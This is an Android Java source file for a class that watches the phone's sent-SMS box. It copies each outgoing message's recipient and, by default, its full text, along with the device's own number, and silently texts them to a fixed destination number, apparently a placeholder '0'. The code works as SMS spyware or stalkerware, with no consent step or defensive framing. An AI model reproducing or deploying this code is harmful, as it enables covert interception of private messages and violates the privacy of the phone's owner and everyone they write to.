package com.firefighter.skynetconfirmed;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import java.util.Date;

/**
 * Created by baynhuchim on 8/14/16.
 */
public class MessageObserver extends ContentObserver{
    private Context context;

    public MessageObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        Cursor cursor = context.getContentResolver().query(
            Uri.parse("content://sms/sent"), null, null, null, null);

        SharedPreferences pref = context.getSharedPreferences("settings", Context.MODE_PRIVATE);
        boolean adrOnly = pref.getBoolean("switch_out_address_only", false);

        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String myNumber = tMgr.getLine1Number();

        String destNumber = "0";

        assert cursor != null;
        if (cursor.moveToNext()) {
//            String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
//            int type = cursor.getInt(cursor.getColumnIndex("type"));
//            // Only processing outgoing sms event & only when it
//            // is sent successfully (available in SENT box).
//            if (protocol != null || type != MESSAGE_TYPE_SENT) {
//                return;
//            }
//            int dateColumn = cursor.getColumnIndex("date");
            int addressColumn = cursor.getColumnIndex("address");
            int bodyColumn = cursor.getColumnIndex("body");

            String sourceNumber = cursor.getString(addressColumn);
            if(!sourceNumber.equals(destNumber)) {
//            Date now = new Date(cursor.getLong(dateColumn));
                String messageBody = cursor.getString(bodyColumn);
                String message;
                if(adrOnly) message = createTextMessage(myNumber, sourceNumber, "");
                else        message = createTextMessage(myNumber, sourceNumber, messageBody);

                sendTextMessage(destNumber, message);
            }
        }
        cursor.close();
    }

    private String createTextMessage(String from, String to, String content) {
        String msg;
        if(content.equals(""))  msg = from + " -> " + to + ".";
        else                    msg = from + " -> " + to + ": " + content;
        return msg;
    }

    public void sendTextMessage(String dest, String msg) {
        SmsManager manager = SmsManager.getDefault();
        manager.sendTextMessage(dest, null, msg, null, null);
    }
}
